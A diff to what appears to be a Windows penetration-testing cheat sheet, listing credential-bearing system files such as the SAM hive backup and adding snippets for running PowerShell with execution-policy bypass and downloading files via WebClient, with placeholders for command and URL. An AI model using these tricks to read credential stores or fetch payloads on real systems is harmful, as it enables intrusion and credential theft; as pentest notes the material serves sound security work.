@@ -18,6 +18,20 @@
 - `C:/Windows/system32/config/regback/sam`. stored password hashes
 - `C:/Windows/System32/drivers/etc/hosts`. hardcoded network hosts
 
+## tricks
+
+### run powershell command
+
+```
+powershell.exe -exec bypass -C "<COMMAND>"
+```
+
+### download file
+
+```powershell
+(New-Object System.Net.WebClient).DownloadFile(<URL>, <OUTPUT>)
+```
+
 ### references
 - [ss64.com: `runas`](https://ss64.com/nt/runas.html)
 - [Windows pentest commands](http://www.networkpentest.net/p/windows-command-list.html)
